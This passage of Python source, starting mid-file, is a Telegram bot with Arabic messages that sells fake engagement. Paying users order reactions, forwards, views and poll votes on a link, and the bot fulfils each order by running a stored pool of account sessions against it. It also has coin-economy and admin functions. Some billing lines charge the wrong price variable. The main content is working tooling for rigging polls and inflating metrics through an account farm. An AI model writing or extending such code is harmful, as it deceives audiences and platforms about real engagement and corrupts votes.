        bot.reply_to(message,text=f'• رجاء ارسل الرابط بشكل صحيح')
        return
    pr = react_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'تفاعلات عشوائي'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr}\n• الرابط : {url} \n• الكمية : {amount}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(reaction(y['s'], url))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= vote_price
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لك يتم ارسال : {false} \n• تم خصم : {true*react_price}',reply_markup=bk)
    return
def get_url_forward(message, amount):
    admins = db.get('admins')
    url = message.text
    if not checks(url):
        bot.reply_to(message,text=f'• رجاء ارسل الرابط بشكل صحيح')
        return
    pr = forward_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'توجيهات'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr}\n• الرابط : {url} \n• الكمية : {amount}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(forward(y['s'], url))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= react_price
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لم يتم ارسال : {false} \n• تم خصم : {true*react_price}',reply_markup=bk)
    return
def get_url_poll(message, amount):
    admins = db.get('admins')
    url = message.text
    x = checks(url)
    if x:
        channel, msg_id = x
    if not checks(url):
        bot.reply_to(message,text='• رجاء ارسل الرابط بشكل صحيح')
        return
    try:
        mm = "• ارسل الان تسلسل الإجابة في الاستفتاء\n\n• يجب ان يتراوح بين 0 : 9\n• علما بان اول اختيار يكون تسلسلة 0"
        x = bot.reply_to(message, mm, parse_mode='HTML')
        bot.register_next_step_handler(x, start_poll, amount, url)
    except Exception as e:
        bot.reply_to(message, "الرسالة ممسوحة أو القناة المجموعة غير صحيحة.")
        print(e)
        return
def start_poll(message, amount, url):
    num = message.text
    if not checks(url):
        bot.reply_to(message,text=f'• رجاء ارسل الرابط بشكل صحيح')
        return
    pr = poll_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'استفتاء'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr}\n• الاختيار : {num}\n• الرابط : {url} \n• الكمية : {amount}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(poll(y['s'], url, int(num)))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= poll_price
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لم يتم ارسال : {false} \n• تم خصم : {true*poll_price}',reply_markup=bk)
    return
def get_view_url(message, amount):
    admins = db.get('admins')
    url = message.text
    if not checks(url):
        bot.reply_to(message,text=f'• رجاء ارسل الرابط بشكل صحيح')
        return
    pr = view_price * amount
    load_ = db.get('accounts')
    acc = db.get(f'user_{message.from_user.id}')
    typerr = 'مشاهدات'
    v = bot.reply_to(message,text=f'• تم بدء طليك بنجاح ✅ : \n\n• النوع : {typerr}\n• الرابط : {url} \n• الكمية : {amount}')
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بطلب من البوت\n• النوع : {typerr}\n• العدد : {amount} \n• الرابط : {url} \n• ايديه : {message.from_user.id} \n• يوزره : @{message.from_user.username} ')
    true, false = 0, 0
    for y in load_:
        if true >= amount:
            break
        try:
            x = asyncio.run(view(y['s'], url))
           
            if x == 'o':
                continue
            if x == True:
                true += 1
            else:
                false += 1
        except Exception as e:
            print(e)
            continue
    if true >= 1:
        for ix in range(true):
            acc['coins'] -= view_price
        db.set(f'user_{message.from_user.id}', acc)
    addord()
    user_id = message.from_user.id
    buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
    buys+=1
    db.set(f"user_{user_id}_buys", int(buys))
    bot.reply_to(message,text=f'• تم اكتمال طلبك بنجاح ✅:\n• تم ارسال : {true}\n• لم يتم ارسال : {false} \n• تم خصم : {true*view_price}',reply_markup=bk)
    return
def check_user(id):
    if not db.get(f'user_{id}'):
        return False
    return True

def set_user(id, data):
    db.set(f'user_{id}', data)
    return True

def get(id):
    return db.get(f'user_{id}')

def delete(id):
    return db.delete(f'user_{id}')

def trend():
    k = db.keys("user_%")
    users = []
    for i in k:
        try:
            g = db.get(i[0])
            d = g["id"]
            users.append(g)
        except:
            continue
    data = users
    sorted_users = sorted(data, key=lambda x: len(x["users"]), reverse=True)
    result_string = "•  المستخدمين الاكثر مشاركة لرابط الدعوى : \n"
    for user in sorted_users[:5]:
        result_string += f"🏅: ({len(user['users'])}) > {user['id']}\n"
    return (result_string)


def detect(text):
    pattern = r'https:\/\/t\.me\/\+[a-zA-Z0-9]+'
    match = re.search(pattern, text)
    return match is not None
def casting(message):
    admins = db.get('admins')
    idm = message.message_id
    d = db.keys('user_%')
    good = 0
    bad = 0
    bot.reply_to(message, f'• جاري الاذاعة الي مستخدمين البوت الخاص بك ')
    for user in d:
        try:
            id = db.get(user[0])['id']
            bot.copy_message(chat_id=id, from_chat_id=message.from_user.id, message_id=idm)
            good+=1
        except:
            bad+=1
            continue
    bot.reply_to(message, f'• اكتملت الاذاعة بنجاح ✅\n• تم ارسال الى : {good}\n• لم يتم ارسال الي : {bad} ')
    return
def adminss(message, type):
    admins = db.get('admins')
    if type == 'add':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'• ارسل الايدي بشكل صحيح')
            return
        d = db.get('admins')
        if id in d:
            bot.reply_to(message, f'• هذا العضو ادمن بالفعل')
            return
        else:
            d.append(id)
            db.set('admins', d)
            bot.reply_to(message, f'• تم اضافته بنجاح ✅')
            return
    if type == 'delete':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'• ارسل الايدي بشكل صحيح')
            return
        d = db.get('admins')
        if id not in d:
            bot.reply_to(message, f'• هذا العضو ليس من الادمنية بالبوت')
            return
        else:
            d.remove(id)
            db.set('admins', d)
            bot.reply_to(message, f'• تم اذالة العضو من الادمنية بنجاح ✅')
            return
def banned(message, type):
    admins = db.get('admins')
    if type == 'ban':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'ارسل الايدي بشكل صحيح')
            return
        d = db.get('badguys')
        if id in d:
            bot.reply_to(message, f'• هذا العضو محظور من قبل ')
            return
        else:
            d.append(id)
            db.set('badguys', d)
            bot.reply_to(message, f'• تم حظر العضو من استخدام البوت')
            return
    if type == 'unban':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'• ارسل الايدي بشكل صحيح')
            return
        d = db.get('badguys')
        if id not in d:
            bot.reply_to(message, f'• هذا العضو غير محظور ')
            return
        else:
            d.remove(id)
            db.set('badguys', d)
            bot.reply_to(message, f'• تم الغاء حظر العضو بنجاح ✅')
            return
def get_info(message):
    id = message.text
    try:
        id = int(id)
    except:
        bot.reply_to(message, f'• ارسل الايدي بشكل صحيح رجاء')
        return
    d = db.get(f'user_{id}')
    if not d:
        bot.reply_to(message, f'• هذا العضو غير موجود')
        return
    # {'id': user_id, 'users': [], 'coins': 0, 'paid': False}
    id, coins, users = d['id'], d['coins'], len(d['users'])
    bot.reply_to(message, f'• ايديه : {id}.\n• نقاطه: {coins} نقطة \n• عدد مشاركته لرابط الدعوة{users}')
    return
def send(message):
    id = message.text
    try:
        id = int(message.text)
    except:
        bot.reply_to(message, f'• ارسل الايدي بشكل صحيح ')
        return
    if not db.exists(f'user_{id}'):
        bot.reply_to(message, f'• هذا العضو غير موجود في البوت ❌')
        return
    if int(message.text) == int(message.from_user.id):
        bot.reply_to(message, f'• عذرا لا يمكنك تحويل نقاط لنفسك ❌')
        return
    x2 = bot.reply_to(message, f'• ارسل الان عدد النقاط التي تريد تحويلها لـ {id}')
    bot.register_next_step_handler(x2, get_amount_send, id)
def get_amount_send(message, id):
    amount = message.text
    try:
        amount = int(message.text)
    except:
        te = bot.reply_to(message, f'• الكمية يجب ان تكون عدد فقط ')
        return
    to_user = db.get(f'user_{id}')
    from_user = db.get(f'user_{message.from_user.id}')
    if amount < 1:
        bot.reply_to(message, f'• لا يمكن تحويل عدد اقل من 1')
        return
    if from_user['coins'] < amount:
        bot.reply_to(message, f'• نقاطك غير كافية لتحويل هذا المبلغ \n• تحتاج الي {amount-from_user["coins"]} نقطة')
        return
    from_user['coins']-=amount
    db.set(f'user_{message.from_user.id}', from_user)
    to_user['coins']+=amount
    db.set(f'user_{id}', to_user)
    try:
        bot.send_message(chat_id=id, text=f"• [👤] تم استلام {amount} من نقاط\n\n- من الشخص : {message.from_user.id}\n- نقاطك القديمة : {to_user['coins']}\n- نقاطك الان : {to_user['coins']+amount}")
    except: pass
    bot.send_message(chat_id=int(sudo), text=f'• قام شخص بارسال  {amount}  نقطة\n من <code>{message.from_user.id}</code> ..')
    bot.reply_to(message, f"• [👤] تم ارسال {amount} من نقاط\n\n- الى الشخص : {id}\n- نقاطك القديمة : {from_user['coins']}\n- نقاطك الان : {from_user['coins']-amount}")
    user_id = message.from_user.id
    trans = int(db.get(f"user_{user_id}_trans")) if db.exists(f"user_{user_id}_trans") else 0
    count_trans = trans + 1
    db.set(f"user_{user_id}_trans", int(count_trans))
    return
def addpoints(message):
    id = message.text
    try:
        id = int(message.text)
    except:
        bot.reply_to(message, f'• ارسل الايدي بشكل صحيح رجاء')
        return
    x = bot.reply_to(message, '• ارسل الان الكمية')
    bot.register_next_step_handler(x, addpoints_final, id)
def addpoints_final(message, id):
    amount = message.text
    try:
        amount = int(message.text)
    except:
        bot.reply_to(message, f'يجب ان تكون الكمية ارقام فقط')
        return
    b = db.get(f'user_{id}')
    b['coins']+=amount
    db.set(f'user_{id}', b)
    bot.reply_to(message, f'تم بنجاح نقاطه الان : {b["coins"]} ')
    return
def setfo(message):
    if "@" not in message.text:
        bot.reply_to(message, f'• رجاء ارسل القناة بشكل صحيح')
        return 
    elif message.text == "/start":
        start_message(message)
        return 
    users = message.text.replace('https://t.me/', '').replace('@',  '').split(' ')
    db.set('force', users)
    bot.reply_to(message, 'تمت بنجاح')
    return
def vipp(message, type):
    if type == 'add':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'• ارسل الايدي بشكل صحيح')
            return
        d = db.get(f"user_{id}")
        if d is None:
            bot.reply_to(message, f'• العضو غير موجود في البوت')
            return
        d['premium'] = True
        db.set(f'user_{id}', d)
        bot.reply_to(message, f'• اصبح العضو {id} من المشتركين الـ ViP')
        return
    if type == 'les':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'• ارسل الايدي بشكل صحيح')
            return
        d = db.get(f"user_{id}")
        if d is None:
            bot.reply_to(message, f'• العضو غير موجود في البوت')
            return
        d['premium'] = False
        db.set(f'user_{id}', d)
        bot.reply_to(message, f"تم انهاء الاشتراك الـ ViP للمستخدم {id}")
def check_dayy(user_id):
    users = db.get(f"user_{user_id}_giftt")
    noww = time.time()    
    WAIT_TIMEE = 24 * 60 * 60
    if db.exists(f"user_{user_id}_giftt"):
        last_time = users['timee']
        elapsed_time = noww - last_time
        if elapsed_time < WAIT_TIMEE:
            remaining_time = WAIT_TIMEE - elapsed_time
            return int(remaining_time)
        else:
            users['timee'] = noww
            db.set(f'user_{user_id}_giftt', users)
            return None
    else:
        users = {}
        users['timee'] = noww
        db.set(f'user_{user_id}_giftt', users)
        return None
try:
    bot.infinity_polling()
except:
    pass
